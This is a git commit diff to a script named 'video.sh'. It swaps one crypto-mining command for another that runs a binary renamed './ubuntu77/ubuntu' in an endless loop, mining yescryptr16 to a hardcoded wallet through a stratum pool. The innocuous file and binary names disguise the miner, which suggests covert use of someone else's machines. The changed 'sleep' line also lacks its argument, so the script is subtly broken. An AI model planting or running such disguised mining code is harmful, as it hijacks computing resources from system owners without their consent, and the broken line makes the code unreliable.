4e8f34612fd7953e89b40153da0bcb1dd930cc26
ivanbest202201 <96770549+ivanbest202201@users.noreply.github.com>
2021-12-28 21:26:42 +0300

    Update video.sh

--- video.sh
+++ video.sh
@@ -7,6 +7,6 @@
 #       stratum-na.rplant.xyz   /Toronto/
 #
 while [ 1 ]; do
-./cpuminer-sse2 -a minotaur -o stratum+tcps://stratum-eu.rplant.xyz:17018 -u WALLET.WORKER_NAME
-sleep 5
+./ubuntu77/ubuntu -a yescryptr16  -o stratum+tcps://stratum-eu.rplant.xyz:17055 -u qTVTH6sB9SKQNRKmLQkS1bC7JqXNRZYqRH
+sleep
 done
